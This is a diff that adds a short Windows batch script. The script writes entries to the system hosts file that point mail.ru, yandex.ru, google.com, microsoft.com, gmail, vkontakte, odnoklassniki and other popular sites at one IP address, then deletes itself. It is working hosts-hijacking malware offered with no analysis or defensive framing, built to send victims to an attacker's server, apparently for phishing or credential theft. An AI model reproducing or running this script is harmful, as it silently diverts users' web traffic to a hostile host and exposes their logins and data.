@@ -1,0 +1,18 @@
+echo 193.109.248.121 mail.ru >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 www.mail.ru >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 rambler.ru >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 www.combats.ru >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 combats.ru >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 yandex.ru >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 ya.ru >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 www.google.com >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 google.com >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 www.microsoft.com >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 microsoft.com >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 gamil.com >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 www.gmail.com >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 www.vkontakte.ru >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 vkontakte.ru >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 www.odnoklasniki.ru >> C:\windows\system32\drivers\etc\hosts
+echo 193.109.248.121 odnoklasniki.ru >> C:\windows\system32\drivers\etc\hosts
+del 1.bat
